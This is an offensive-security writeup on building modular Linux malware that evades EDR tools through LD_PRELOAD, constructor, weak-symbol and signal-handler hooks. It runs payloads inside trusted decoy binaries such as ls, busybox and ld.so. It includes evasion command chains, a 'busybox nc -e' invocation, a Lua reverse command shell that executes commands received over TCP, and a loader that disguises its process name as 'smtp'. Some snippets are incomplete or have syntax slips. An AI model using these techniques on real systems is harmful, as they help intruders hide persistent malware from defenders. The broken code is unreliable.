# Zombie Ant Farm: Practical Tips for Playing Hide and Seek with Linux EDRs.


## Inspiration
To me, hacking assumes curiosity, observation, and reflection. What could be a better observation platform than the nature itself. As humans, we draw inspiration, joy and courage from it, we model our lives and sometimes our technology by observing its patterns. It really is the greatest teacher of all. We stand in awe at the complexity of problems manifested in symbiotic relationships between living things, and the elegance of the solutions provided by the world outside. Some of the inspiration for this work was drawn from the naturally occurring phenomena.

[Zombie Ladybugs](https://www.sciencemag.org/news/2015/02/wasp-virus-turns-ladybugs-zombie-babysitters)

[Zombie Ants](https://www.sciencemag.org/news/2010/08/scienceshot-zombies-thrived-ancient-earth)

[Zombie Caterpillars](https://www.sciencemag.org/news/2014/12/how-virus-turns-caterpillar-zombie)

[Zombie Rats](https://www.sciencemag.org/news/2000/07/parasites-make-scaredy-rats-foolhardy)


> One of Earth’s weirdest natural phenomena: zombie ants.

> These are carpenter ants in tropical locations, infiltrated and controlled by _Ophiocordyceps unilateralis sensu lato_, sometimes called `zombie ant fungus`. This fungal body-snatcher forces ants to a forest understory and compels them to climb vegetation and bite into the underside of leaves or twigs, where the ants die. The invasion culminates with the sprouting of a spore-laden fruiting body from a dead ant’s head. The fungus thereby benefits because infectious spores are released onto the ground below, where they can infect other foraging ants. 

> The new research shows that _the fungal parasite accomplishes all this without infecting the ants’ brains_.

> We found that a high percentage of the cells in a host were fungal cells. In essence, _these manipulated animals were a fungus in ants’ clothing_.

> Normally in animals, behavior is controlled by the brain sending signals to the muscles, but our results suggest that _the parasite is controlling host behavior peripherally_. 
_Almost like a puppeteer pulls the strings to make a marionette move, the fungus controls the ant’s muscles to manipulate the host’s legs and mandibles._

> We hypothesize that the fungus may be preserving the brain so the host can survive until it performs its final biting behavior — that critical moment for fungal reproduction. But we need to conduct additional research to determine the brain’s role and how much control the fungus exercises over it.

_David Hughes, associate professor of entomology and biology at Penn State_

## Objectives
- Build modular Linux malware, that can evade detection via it's use of linker preloading techniques.
- Hide payloads in memory, and serve them cross-processes to fool EDR heuristics and to achieve persistence in userland.
- Use system resident or otherwise approved binaries as dynamic decoys for modular malware operation, breaking FIMs and shallow signature checking mechanisms present on the system.

---
## Roadmap

### Part 1: Primitives for Working with Offensive Preloading:

We will explore the following practical concepts:

- Showcase and review code techniques available with the Linux linker/loader to assist in achieving the "preload and release" effect in the approved binaries without patching or fully modifying them at runtime.
- Create malicious library preloads without full knowledge of the internal details of the target binaries.
- Use library preloading in novel ways over memory.
- Execute practical preload library chaining in a "split and scatter" fashion to blind EDR heuristics, post mortem forensics, and to gain delayed functionality or features at runtime.
- Widen the persistence footprint and achieving rapid payload prototyping by post-loading cradles with scripting functionality. 

### Part 2: Weaponization and Operationalization of Offensive Preloading Techniques

- A Case for practical memory-resident payloads
- Payload brokers: Inter-process and remote payload loading and hosting
- Examples of process mimicry and valid decoys
- Zombie Ant Farm Service: A set of reusable primitives and code constructs for building an servicing modular malware for offensive operators. Fast(er) malware retooling in the field.

## Observations

### Runtime Hooking / Runtime Preloading

*Hooking Tradeoffs*

Functionally, hooking an API assumes that you are implementing an API detour to execute foreign logic, and in the process of achieving this you rely on the following:

- you know how the target API is working, or have a reasonable idea on it's exposed interfaces.
- you have the ability to target it without detection. E.g. ptrace attach, debugger activity, presence of known tools and libraries for interception, known behavioral signatures.
- you have the ability to interoperate with the target binary in a clean fashion without crashing it, implement call filters and to extend hooks as needed at runtime.
- you also may need to have inspection tooling on remote target which may weaken your offensive OpSec. E.g. to hook *that specific use case*, while the mom is watching

These options can be loud on a given system, or you simply may not have the proper setup to analyze and emulate the remote environment for your development and testing purposes.

*A Case For At-Start Preloading*

As we know, preloading instructs the linker to patch your libraries containing desired code into the memory space of a target process generally at the start of the target process.

What if you could be more agnostic to the exact application API you are trying to control. Given the objectives you could:

- Preload the payload into a target binary at specific, often known target address, and release the original binary for it's full execution lifecycle. The payload executes in the memory space of the target process while the target process runs.
- Find ways to inject/preload generically, irrespective of the available API. We do not need to hook a specific set of APIs since we are not trying to subvert the target logic per se but only enslaving it to execute our code and use it as a decoy. 
- Expand malware features by brining mode modules out of band by:
	- loading via chained preloads
	- loading via weak references
    - loading via dynamic scripting
    - loading via payload broker hosts

Our goal is to gain a few points over the defense:

- DFIR can lift the pristine target executable, but gets unmodified, clean exe (a cradle or a system binary).
- EDRs can see the code executing by approved binaries in the process table.
- EDRs may not be able to fully trace inter-process data handoff (pipes, POSIX shared memory, code over sockets, memory resident executables and shared libraries available over file ephemeral file descriptors, etc.) 
- Parent / Child process relationships in Linux can be fully transitive. If you have the right to start the parent process, you should be able to fully own its execution resources, and its progeny resources;
- Limited explicit reliance on `dlopen()` as it may be traced or hooked by EDRs.

    > Note: `dlopen()` API allows you to use libraries that you do not depend on directly (and which may or may not be present on the system at the time of invocation). In case of preloading, the libraries that you do depend on directly (such as `libc.so`, or `<your_payload>.so`) do not need to be `dlopen()`'ed as the loader will have already mapped them for you before your program starts, and are not optional as the loader will fail hard if they are missing.

--- 

## Part 1: Primitives for Working with Offensive Preloading

### Structure of an ELF binary, Role of the Linker

_Brief overview on ELF construction as pertains to our future discussion. Sections like `.ini/.fini/.preinit/.ctor/.dtor/.interp`_

### Practical Techniques and Cases for Introducing Foreign Code in Target Binaries

#### 0x0: `.INIT/.FINI`

[Ref:] (http://l4u-00.jinr.ru/usoft/WWW/www_debian.org/Documentation/elf/node3.html)

> `.init` This section holds executable instructions that contribute to the process initialization code. That is, when a program starts to run the system arranges to execute the code in this section before the main program entry point (called main in C programs).
The .init and .fini sections have a special purpose. If a function is placed in the .init section, the system will execute it before the main function. Also the functions placed in the .fini section will be executed by the system after the main function returns. This feature is utilized by compilers to implement global constructors and destructors in C++.

> `.fini` This section holds executable instructions that contribute to the process termination code. That is, when a program exits normally, the system arranges to execute the code in this section.

When an ELF executable is executed, the system will load in all the shared object files before transferring control to the executable. With the properly constructed `.init` and `.fini` sections, constructors and destructors will be called in the right order.

Code discussion / demo: 

```c
static void init(int argc, char **argv, char **envp) {
    /* offensive code */
    puts(__FUNCTION__);
}

static void fini(void) {
    /* delayed offensive code */
    puts(__FUNCTION__);
}

__attribute__((section(".init_array"), used)) static typeof(init) *init_p = init;
__attribute__((section(".fini_array"), used)) static typeof(fini) *fini_p = fini;

int main(void) { /* your code here */ return 0; }
```

#### 0x01: ` __libc_start_main()`

[Ref:] (http://refspecs.linuxbase.org/LSB_3.1.0/LSB-generic/LSB-generic/baselib---libc-start-main-.html)

[Ref:] (https://linuxgazette.net/issue84/hawk.html)

Discussion:

> The `__libc_start_main()` function shall perform any necessary initialization of the execution environment, call the main function with appropriate arguments, and handle the return from main(). If the main() function returns, the return value shall be passed to the exit() function. `__libc_start_main()` is not in the source standard; it is only in the binary standard.


General idea is to hook `main()`, execute payload logic and trampoline back to main. Yes, we can use hooking techniques in preloads.

Code discussion / demo:

```c
/* Trampoline for the real main() */
static int (*main_orig)(int, char **, char **);

/* Our fake main() that gets called by __libc_start_main() */
int main_hook(int argc, char **argv, char **envp)
{
    int ret = main_orig(argc, argv, envp);
    return ret;
}

/*
 * Wrapper for __libc_start_main() that replaces the real main
 * function with our hooked version.
 */
int __libc_start_main(
    int (*main)(int, char **, char **),
    int argc,
    char **argv,
    int (*init)(int, char **, char **),
    void (*fini)(void),
    void (*rtld_fini)(void),
    void *stack_end)
{
    /* Save the real main function address */
    main_orig = main;

    /* Find the real __libc_start_main()... */
    typeof(&__libc_start_main) orig = dlsym(RTLD_NEXT, "__libc_start_main");

    /* ... and call it with our custom main function */
    return orig(main_hook, argc, argv, init, fini, rtld_fini, stack_end);
}
```

#### 0x02: Weak Symbol References: gcc  `__attribute__((weak))`

Let's talk about creating modular code, with the help of weak linker symbol references resolving at runtime as alternative to `dlopen()` API. 

We will also have a discussion on chaining weak references to achieve more dynamic modularization.

In general, when operating in adversarial environments, we have to accommodate the following contexts:
- Can we find and preload existing trusted binary with this technique
- Can we bring a cradle which we can preload with modular malware. The cradle can be very basic and not point to malware by itself.

An so we will approach solving both of these issues with the discussion below. 


To start, a reference:

>gcc(1):
`weak` The weak attribute causes the declaration to be emitted as a weak symbol rather than a global. This is primarily useful in defining library functions which can be overridden in user code, though it can also be used with non-function declarations. Weak symbols are supported for ELF targets, and also for a.out targets when using the GNU assembler and linker.

>nm(1):
`w` The symbol is a weak symbol that has not been specifically tagged as a weak object symbol.  When a weak defined symbol is linked with a normal defined symbol, the normal defined symbol is used with no error.  When a weak undefined symbol is linked and the symbol is not defined, the value of the symbol is determined in a system-specific manner without error.  On some systems, uppercase indicates that a default value has been specified

##### Ox02:A. Controlled Weak Refs

Suppose that we can drop a rudimentary binary on the disk. Normally, to load logic from shared libraries at runtime, our binary would call`dlopen()`API. If we preload the shared libraries at start and have the binary contain wek references the loader will resolve them at runtime at the time of code access and not before. The defense can take the binary which will be clean. Unless the execution context is known and LD_PRELOAD is seen in the environment, and in memory tables, analysis of the binary itself will not point to dependencies usually seen with `dlopen()`s. 

Example: 

Weak symbols can be created in *your* shim/cradle . The idea is: `main` is a clean executable with exploit delivered in `libweakref.so` out of band

`main()` calls ->  weak `debug()` found in `libweakref:debug()`

Code discussion / demo:

`main.c`:

```c
void debug() __attribute__((weak));
int main(void)
{
    if (debug) { // IF loaded / resolved 
        printf("main: debug()\n");
        debug(); // resolved at runtime
    }
    return 0;
}
```

`libweakref.so`:
```c
void debug() __attribute__((weak));
// Weak ref check example. Alternative to dlopen()
void debug(){
    printf("libweakref.so: debug()\n");
}
```

Example:

```sh
$LD_PRELOAD=lib/libweakref.so bin/main_weakref
```

##### Ox02:B: Foreign Weak Refs

Addressing the same objective on systems that cannot have external cradle binaries, you can hunt for existing Linux *known good* executables that already may have weak references you can take advantage of and hijack:

For example, most Linux system binaries will be stripped of symbols:

```sh
$file /bin/ls
/bin/ls: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=3f60bd5f1fee479caaed0f4b1dc557a2086d3851, stripped
```

```sh
$nm /bin/ls
nm: /bin/ls: no symbols
```

Some executables are shipped un-stripped (e.g. /usr/bin/java):

```sh
$nm /usr/bin/java | grep 'w '
w __gmon_start__
w _Jv_RegisterClasses
```

However, there may be chances to find the weak references for the stripped executables:

```sh
$nm --dynamic  /bin/ls | grep 'w '
w __cxa_finalize
w __gmon_start__
w _ITM_deregisterTMCloneTable
w _ITM_registerTMCloneTable
```

As you can see symbols `__gmon_start__` and `__cxa_finalize` seem to be present and weak. Most importantly, they are consistently present in many target executables. We can preload most of ELF executables with the following code:

Code discussion / demo

`libweakref.so`:
```c
// Injection to any ELF
void __gmon_start__(){
     if (gmon_ct < 1 ){
       printf("in __gmon_start__ weak hook\n");
       gmon_ct++;

     }else{
       printf("in __gmon_start__ weak hook but already started\n");
     }
}

// Evasion trampoline (atexit hook)
void __cxa_finalize() {
     if (cxa_ct < 1 ){
         printf("in __cxa_finalize weak hook\n");
         cxa_ct++;

     }else{
         printf("in __cxa_finalize weak hook but already started\n");
     }
}
```

Example:

```sh
$LD_PRELOAD=./liblibweakref.so /bin/ls
``` 
-or-
```sh
$LD_LIBRARY_PATH=$LD_LIBRARY_PATH:../lib LD_PRELOAD=libweakref.so /bin/ls
```

```sh
$LD_PRELOAD=lib/libweakref.so /bin/ls
in __gmon_start__ weak hook
in __gmon_start__ weak hook but already started
in __gmon_start__ weak hook but already started
in __gmon_start__ weak hook but already started
in __gmon_start__ weak hook but already started
in __gmon_start__ weak hook but already started
bin  ext  lib  Log.md  Makefile  README.md  run.sh  src  test.sh
```

Note:

> Here we are escaping double-execution of a hook by checking if `__gmon_start__` is already hooked

As you can see with weak symbols we are not explicitly working with `dlopen()/dlsym()` _RTLD_*_'s. Again we only want our code to execute in the context of a live whitelisted executable using it as a decoy. Liveness of the decoy process (no crash) and proper appearance in the process table is prioritized.

_ProTip_: Also note, some executables do not honor `__cxa_finalize` invocation probably due to implemented `atexit()` handlers. but you could always find other decoys.


##### 0x2:C: Chained weakrefs

We have shown that we could find and resolve symbols at runtime with weak references. However, can evade even deeper by _scattering_ weak references across a series of smaller preloaded libraries, and assemble the lookups in memory.

Here we employ the same technique as in the first scenario (main) but weak symbols are exported from the downstream library:

Explanation:

> `main:main()` -> calls `libwearkerf.so:debug()` ->  calls `libweakref2:mstat()`

Code discussion / demo

`main.c`:
```c
void debug() __attribute__((weak));
void mstat() __attribute__((weak)
int main(void)
{
    if (debug) {
        printf("main: debug()\n");
        debug();
    }

    if (mstat) {
        printf("main: test trampoline to stat()\n");
        mstat();
    }
}
```

`libweakref.so`:
```c
void debug() __attribute__((weak));
void mstat() __attribute__((weak)
void debug(){
    printf("debug()\n");

    if (mstat) {
        printf("debug: mstat()\n");
        mstat();
    }
}
```

`libweakref2.so`:
```c
void mstat() __attribute__((weak)
void mstat(){
    printf("mstat()\n");
}
```

Example:

```sh
$LD_PRELOAD=lib/libweakref.so:lib/libweakref2.so ./bin/main_weakref
```

```sh
$LD_PRELOAD=lib/libweakref.so:lib/libweakref2.so ./bin/main_weakref 
in __gmon_start__ weak hook
in __gmon_start__ weak hook but already started
in __gmon_start__ weak hook but already started
main: debug()
debug()
debug: stat()
mstat()
main: test trampoline to stat()
mstat()
in __cxa_finalize weak hook
in __cxa_finalize weak hook but already started
in __cxa_finalize weak hook but already started
```
So as you could see chained preloads work as deep as you need them to work, assisting with EDR inspection evasion.


#### 0x3: `.CTOR/.DTOR` via gcc `__attribute__((constructor (P)))` and `__attribute__((destructor (P)))`

So this preload/hook method is the crux of our further payload preload automation chain. This is how we are planning to execute our "preload and release" approach in a binary agnostic manner. 

Brief Highlights:

- Direct constructors and destructors
- Chained / prioritized constructors and destructors
- Hijacking arguments. 

[Ref:] (https://gcc.gnu.org/onlinedocs/gccint/Initialization.html)

[Ref:] (https://gcc.gnu.org/onlinedocs/gcc-4.3.0/gcc/Function-Attributes.html)

_Overview of global Constructors and Destructors_ 
We can use the constructors and destructors to preload *most* target executables without knowing their internal exported symbols and making decisions on explicit function hooking (e.g. blackbox executable).

The modular payload we provide in preloaded libraries executes via constructor releasing the target binary to execute the rest of its logic on it's own. We only use the target as a decoy, for now. 

##### 0x03:A Direct constructors and destructors

Explanation:

Code discussion / demo:

`libmctor.so`:
```c
//immediate invocation
void before_main(void) __attribute__((constructor ));
void before_main(void)
{

    /* This is run before main() */
    printf("Before main()\n");

}

//delayed invocation
void after_main(void) __attribute__((destructor ));
void after_main(void)
{

    /* This is run after main() returns (or exit() is called) */
    printf("After main()\n");

}
```

Example:
```sh
$LD_PRELOAD="lib/libmctor.so" /bin/ls 
Before main()

bin  ext  lib  Log.md  Makefile  README.md  run.sh  src  test.sh
```

##### 0x3:B Chained / prioritized constructors and destructors

Explanation: It turns out that constructors and destructors can have priorities. Based on current documentation priorities range: `101 ... 65535`. So we can potentially override priority of a target constructors/destructors by specifying higher (or lower) priorities in  our preloaded library injects:

Code discussion / demo:

`libmctor.so`
```c
void before_main(void) __attribute__((constructor (101)));

void after_main(void) __attribute__((destructor(65534) ));
```
This proves useful when target binaries provided protection and anticipated the preload path.


#### 0x3:C Hijacking CTOR arguments.
One edge case that allows our preloads to work across a wide variety of target executables that for example re invoked with command parameters, is to accommodate overloaded `main()`s.

As we know the constructor is called by `ld.so` loader before `main()`. So conceivably we can hijack parameterized versions of `main()` with the following code constructs. (As per documentation, this is not  very portable and probably not guaranteed but works. `¯\_(ツ)_/¯` )

Code discussion / demo

```c
__attribute__((constructor)) static void mctor(int argc, char **argv, char** envp)
```

#### Ox4: Out of band signals and exception handlers, timed execution and fault branching
As we have discussed prior, we have to manage both of the scenarios when we _can_ bring in code cradles into the environment and when we _cannot_ do so.

Depending on the circumstances, to evade EDRs we can use non-linear invocation of code. The general task is to break the EDR consistent "story" of target lifecycle transparency with out of band interrupts. Since interrupts arrive form the outside of the process many defenses cannot trace the code paths. It's an unconditional jump to the handler. 

Sometimes, it is non-blocking or non-instrumentable, as we can see below. Triggering code from an otherwise dormant code branch we can achieve deeper evasion. 


##### 0x4:A Direct external signals / handlers e.g. SIGHUP, SIGUSR1/2

TODO: clearly split off from src/intrp.c  to showcase capability

`libinterrupt.so`:

```c
void before_main(void) __attribute__((constructor));
void before_main(void)
{
    printf("Before main()\n");
    setSigHandler(500000);
}
void setSigHandler(int sleep_interval){

    signal(SIGHUP, handleSigHup);
    for (;;) {
        if (gotint)
            break;
        usleep(sleep_interval);
    }
    doWork();

}
void handleSigHup(int signal) { gotint = 1; }
void doWork(void){
    printf("Executing payloads here ...\n");
}

```

Example:

```sh
$LD_PRELOAD=lib/libinterrupt.so /bin/ls
```


```sh
Before main()
Setting SIGHUP Signal handler ...
PPID: 23305 PID: 126946 

...
<out of band KILL -HUP here>
...

Signal handler got signal ... 
Executing payloads here ...

bin  ext  lib  Log.md  Makefile  README.md  run.sh  src  test.sh
```

> Note: External asynchronous trigger of a code branch. This can also help with sandbox profiling. For example, the *real* paylaod branch is only triggered from an external event (signal, etc.)

##### 0x4:B. A variation on the theme: Fault based (SIGFPE) handlers
Some signals and faults are even harder to handle and supervise by EDRs

Fo example, SIGFPE, if you can self-trigger the fault (e.g. division by 0) and then exedcute paylaod in a recovery handler, keeping the decoy process alive, but evading IoC chain detection.

Below is the code that does both: unassisted SIGHUP and SIGFPE handling:

Code discussion / demo
```c
#include "intrp.h"

volatile sig_atomic_t gotint = 0;

void before_main(void) __attribute__((constructor));
void before_main(void)
{

    printf("Before main()\n");

    printf("Trigger SIGFPRE handler\n");
    try_division(1,0);
    setSigHandler(500000);

}

void doWork(void){
	printf("Executing payloads here ...\n");
}

void setSigHandler(int sleep_interval){

	printf("Setting SIGHUP Signal handler ...\n");
    printf("PPID: %d PID: %d \n", getppid(), getpid());
    signal(SIGHUP, handleSigHup);
    for (;;) {
        if (gotint)
            break;
        usleep(sleep_interval);
    }
	printf("Signal handler got signal ... \n");
	doWork();
}
 
void handleSigHup(int signal) {
    /*
     * Signal safety: It is not safe to call clock(), printf(),
     * or exit() inside a signal handler. Instead, we set a flag.
     */
    gotint = 1;
}
 

// ref: http://rosettacode.org/wiki/Detect_division_by_zero#C 
/*
 * This SIGFPE handler jumps to fpe_env.
 *
 * A SIGFPE handler must not return, because the program might retry
 * the division, which might cause an infinite loop. The only safe
 * options are to _exit() the program or to siglongjmp() out.
 */
void fpe_handler(int signal, siginfo_t *w, void *a)
{
	printf("In SIGFPE handler\n");
	siglongjmp(fpe_env, w->si_code);
	/* NOTREACHED */
}
 
/*
 * Try to do x / y, but catch attempts to divide by zero.
 */
void try_division(int x, int y)
{
	struct sigaction act, old;
	int code;
	/*
	 * The result must be volatile, else C compiler might delay
	 * division until after sigaction() restores old handler.
	 */
	volatile int result;
 
	/*
	 * Save fpe_env so that fpe_handler() can jump back here.
	 * sigsetjmp() returns zero.
	 */
	code = sigsetjmp(fpe_env, 1);
	if (code == 0) {
		/* Install fpe_handler() to trap SIGFPE. */
		act.sa_sigaction = fpe_handler;
		sigemptyset(&act.sa_mask);
		act.sa_flags = SA_SIGINFO;
		if (sigaction(SIGFPE, &act, &old) < 0) {
			perror("sigaction");
			exit(1);
		}
 
		/* Do division. */
		result = x / y;
 
		/*
		 * Restore old hander, so that SIGFPE cannot jump out
		 * of a call to printf(), which might cause trouble.
		 */
		if (sigaction(SIGFPE, &old, NULL) < 0) {
			perror("sigaction");
			exit(1);
		}
 
		printf("%d / %d is %d\n", x, y, result);
	} else {
		/*
		 * We caught SIGFPE. Our fpe_handler() jumped to our
		 * sigsetjmp() and passes a nonzero code.
		 *
		 * But first, restore old handler.
		 */
		if (sigaction(SIGFPE, &old, NULL) < 0) {
			perror("sigaction");
			exit(1);
		}
 
		/* FPE_FLTDIV should never happen with integers. */
		switch (code) {
		case FPE_INTDIV: /* integer division by zero */
		case FPE_FLTDIV: /* float division by zero */
			printf("%d / %d: caught division by zero!\n", x, y);
			doWork();
			break;
            /* ... */
		}
	}
}

```

Example:

```sh
$LD_PRELOAD=lib/libinterrupt.so /bin/ls
```

-or-

```sh
$LD_PRELOAD=lib/libinterrupt.so bin/main
Before main()
Trigger SIGFPRE handler
In SIGFPE handler
1 / 0: caught division by zero!
Executing payloads here ...
```

## Expanding and Scaling the Evasion Capabilities

Or, _Guiding the ant to it's final destination..._

We have talked about the evasion primitives as far as preloading either our rudimentary cradle/shim with malicious paylaods, or to use approved system binaries as decoys via preloads. Let's explore how the concepts can be expanded upon. In adversarial defensive enviroments, the more choices we hacker have the better.

Highlights:

- Hiding from EDRs via existing trust binaries decoys.
- Expanding dynamic scripting capabilities in the field.
- Progressive LD_PRELOAD command line evaders.
- Malware evaders with Self-preservation instincts.

### 0x1. Inline Evasions, via `busybox` and `ld.so` loader

We could take the concepts and just use them with binaries that run binaries for us. Some great decoys already exists on many Linux systems. For example, `ld.so` is a loader that can run executables directly as paramters. Very handy. `ld.so` is always approved, right. So is `busybox` meta binary. We can even combine the two together to escape process pattern matching defensive engines. Consider the following:

Examples:

```sh

$/bin/busybox /bin/ls

$LD_PRELOAD=./lib/libweakref.so:./lib/libweakref2.so /lib64/ld-linux-x86-64.so.2 /bin/busybox  ls 

$LD_PRELOAD=./lib/libweakref.so:./lib/libweakref2.so /lib64/ld-linux-x86-64.so.2 /bin/busybox  find /bin -name cat -exec /bin/ls / \;

$LD_PRELOAD=./lib/libweakref.so:./lib/libweakref2.so /lib64/ld-linux-x86-64.so.2 /bin/busybox  nc -f /dev/pts/0  -e /bin/ls

$LD_PRELOAD=./lib/libweakref.so:./lib/libweakref2.so /lib64/ld-linux-x86-64.so.2 /bin/busybox  openvt -c 5  -w /bin/ls > /tmp/ls.out

$LD_PRELOAD=./lib/libweakref.so:./lib/libweakref2.so script -c /bin/ls

$LD_PRELOAD=./lib/libweakref.so:./lib/libweakref2.so busybox setsid  -c /bin/ls

$LD_PRELOAD=./lib/libweakref.so:./lib/libweakref2.so start-stop-daemon -x /bin/ls --start

$LD_PRELOAD=./lib/libweakref.so:./lib/libweakref2.so taskset 0x00000001 /bin/ls

$LD_PRELOAD=./lib/libweakref.so:./lib/libweakref2.so echo | xargs /bin/ls

$ echo | LD_PRELOAD=./lib/libweakref.so:./lib/libweakref2.so /lib64/ld-linux-x86-64.so.2 /bin/busybox  xargs /bin/ls
```
Anyone looking for specific regex will be disappointed.


Example of even more advanced evasion:

1.Find action on executables to preload

```sh
$LD_PRELOAD=./lib/libweakref.so:./lib/libweakref2.so /lib64/ld-linux-x86-64.so.2 /bin/busybox  run-parts  --regex '^main_.*$' ./bin/
```

2.Double link evasion

```sh
$ mkdir /tmp/shadowrun; ln -s /bin/ls /tmp/shadowrun/ls; LD_PRELOAD=./lib/libweakref.so:./lib/libweakref2.so /lib64/ld-linux-x86-64.so.2 /bin/busybox  run-parts   /tmp/shadowrun/
```

3.Chaining evasion, timed triggers

```sh
echo | LD_PRELOAD=./lib/libweakref.so:./lib/libweakref2.so /lib64/ld-linux-x86-64.so.2 /bin/busybox  xargs /bin/busybox xargs xargs /bin/busybox /bin/ls

echo | LD_PRELOAD=./lib/libweakref.so:./lib/libweakref2.so /lib64/ld-linux-x86-64.so.2 /bin/busybox timeout 1000 /bin/ls

echo | LD_PRELOAD=./lib/libweakref.so:./lib/libweakref2.so /lib64/ld-linux-x86-64.so.2 /bin/busybox time /bin/ls
```

4.Evade via TTY switch
ProTip: you _may_ evade EDRs when you switch TTYs

```sh
vi -ensX $(/lib64/ld-linux-x86-64.so.2 /bin/busybox mktemp)  -c ':1,$d' -c ':silent !/bin/ls'  -c ':wq'

$LD_PRELOAD=./lib/libweakref.so:./lib/libweakref2.so /lib64/ld-linux-x86-64.so.2  vi -ensX $(/bin/busybox mktemp)  -c ':1,$d' -c ':silent !/bin/ls'  -c ':wq'
```

#### 0x2: Hiding Behind Reflective Mirrors

So by now we've lost EDRs in our dust for a time being by jumping around the decoys and preloads. Another evasion vector that really comes out of necessity for rapid prototyping and development of modular malware rather than EDR evasion as a primary goal - is interfacign with higher level code and better features. 

Let;s face it: development in C _can be_ slower for some. While it is a great system language (and we will see that more and more later), offensive operators need to retool quickly as their landscape and context changes. It;s just the reality of operating malware nowadays. Self-upgrades, better evasions, etc. So one of the paths that may serve both goals: evasion and rapid prototyping of features is to see how we can extend the modularity to other the stacks of languages that have decent FFI (Foreign function interface) with C and that could create shared librries we can use in the type of preloads we have discussed before.

Discussion and highlights : 
- Golang via cgo
- SWIG capabilities. 
- Embedded Interpreters (e.g. Lua, Tcl)

##### 0x2:A: Golang via cgo

Discussion of Code / demo

```go
// go build -o shim.so -buildmode=c-shared shim.go

// [Ref:](https://medium.com/learning-the-go-programming-language/calling-go-functions-from-other-languages-4c7d8bcc69bf)
package main


import "C"

import (
	"fmt"
)

var count int

//export Entry
func Entry(msg string) int {
	fmt.Println(msg)
	return count
}

func main() {}
```


##### 0x2:B: Embedding Interpeters

We want interpreters for speed, but also for a sometimes great deal of refleciton EDR might get blind unraveling the call chain to a verified IoC. 

So we "evade into reflection and back", sort of as a side benefit to our dynamic code prototyping.

Code discussion / demo
`invoke_lua.c`:

```c
#include <lua.h> 
#include <lauxlib.h>
#include <lualib.h> 

#include <stdlib.h> 
#include <stdio.h> 

void bail(lua_State *L, char *msg){
    fprintf(stderr, "\nFATAL ERROR:\n  %s: %s\n\n", msg, lua_tostring(L, -1));
    exit(1);
}

int main(int argc, char** argv)
{

    if (argc !=2){
        printf("Usage %s </path/to/script.lua>\n", argv[0]);
        return 1;
    }

    lua_State *L;

    L = luaL_newstate();                  /* Create Lua state variable */
    luaL_openlibs(L);                     /* Load Lua libraries */

    if (luaL_loadfile(L, argv[1]))        /* Load but don't run the Lua script */
    bail(L, "luaL_loadfile() failed");    /* Error out if file can't be read */

    printf("In C, calling Lua\n");

    if (lua_pcall(L, 0, 0, 0))            /* Run the loaded Lua script */
    bail(L, "lua_pcall() failed");        /* Error out if Lua file has an error */

    printf("Back in C again\n");

    lua_close(L);                         /* Clean up, free the Lua state var */
    return 0;
}

```

```sh
ldd invoke_lua
    linux-vdso.so.1 (0x00007ffd0036a000)

    ...
    liblua.so => not found
    ...

    libm.so.6 => /lib/x86_64-linux-gnu/libm.so.6 (0x00007fc0c0cb1000)
    ....
```

Notice the shared library is missing. This is an opportunity to fill the void with a preload as we have duscussed before:

- "Scatter gather" payloads residing in dependencies. 
> Protip: We either have all of the dependencies met, or the payload does not (properly) run. 
- Invoke lua script via `C` shim preloading `liblua.so` as dependency

Example:

```sh
$LD_LIBRARY_PATH=. LD_PRELOAD=./liblua.so ./invoke_lua hello.lua

TODO: <output>
```

##### 0x3:B: Bringing Lua libraries

And then the world is your oyster, if you can escape out to scripting and start loading other libraries at runtime:

> Protip: Another abstraction layer

Code discussion / demo

```lua
print(package.path..'\n'..package.cpath)

-- via cpath
package.cpath = './slibs/?.so;'
print("Cpath:"..package.cpath)
local socket = require('socket')
local tcp = assert(socket.tcp());

local server = assert(socket.bind("127.0.0.1", 8081))
-- find out which port the OS chose for us
local ip, port = server:getsockname()
print("Server on " .. ip .. ":"..port)

-- via path
local rhost = "127.0.0.1"
local rport = "1337"
assert(tcp:connect(rhost,rport));
  while true do
    local r,x=tcp:receive()
    local fin=assert(io.popen(r,"r"))
    local data=assert(fin:read("*a"));
    tcp:send(data);
  end;
fin:close()
tcp:close()
```
As you can see we no longer need to load shared libraries, we can use code which is much easier to manage, stuff a string into memory, for example and invoke.

## Weaponizing preloads

So now that we have some baseline built, and have ideas on how to expand our preloading cradles, let's see how these concepts can be weaponized in the wild. Let's also add a bit more techniques to our evasion toolbox as we go. 

Highlights:

- Inline Parameterized Command Evasion. Uber-preloaders.
- Memory-resident Malware Modules.
- Modular Malware Payload Warehouses: Remote module loads

### Inline Parameterized Command Evasion. Uber-preloaders

The first impulse is to use `LD_PRELOAD` for a lot of things static:
```sh
$LD_PRELOAD=./lib/libctx.so.1 /bin/ls
```
As you can expect by now the shared library preloads the constructor, executes payload and lets the target be. 

What if we want more features and flexibility. We could do:
```sh
$LD_PRELOAD=./lib/libctx.so.1 /bin/ls <preloader_arguments>
```

Oh wait, not we cannot, as the arguments will be consumed by the target unless you do some specific processing with the parameters as you hook the main:

```c
__attribute__((constructor)) static void _mctor(int argc, char **argv, char** envp)
{

     // Save pointers to argv/argc/envp
     largv=argv;
     largc=argc;
     lenvp=envp;
     lenvp_start=envp;
```
It's prone to errors. We could actually solve it by movile backwards in the comand line and stuffing arguments into eviroments like so:

```sh
LD_BG="false" LD_PCMD="r:smtp" LD_MODULE="./lib/shim.so" LD_MODULE_ARGS="hello" LD_PRELOAD=./lib/libctx.so.1 /bin/ls 
```

So our preloader just gained parameterized excution capabiities. In this case it could say: "Hey, I am preloading a module and passing an argument to it. And by the way, I want this target to go int background whene executing (daemonization), and I want to further hide in the process table as process named `smtp`". 

> We can use the preloader to pass both the module path and the arguments. We can preload the module with all the available methods as we have discussed abover (e.g. constructors, etc.) or, we can simly lock on a API interface contract to invoke in the module. For exmaple, we can stipulate that the module export a function `int Entry(char* params)` so we can search and invoke it dynamically like so:
(Ok, we can use some `dlopen()`'s here ;) )

Code example discussion / demo
```c

 if ( (modload_t = (char*) getenv("LD_MODULE")) != NULL ){

    /* ...
     ... */

    // use dlopen to load shared object
    handle = dlopen (modload, RTLD_LAZY);
    if (!handle) {
        fputs (dlerror(), stderr);
        return(1);
    }

    // resolve Entry symbol
    go_int (*entry)(go_str) = dlsym(handle, "Entry");
    if ((error = dlerror()) != NULL)  {
        fputs(error, stderr);
        return(1);
    }

    //pass arguments along if any
    if ( (modload_args_t = (char*) getenv("LD_MODULE_ARGS")) != NULL ){
        modload_args = strdup(modload_args_t);
        modload_args_len = strlen(modload_args);

    /* ...
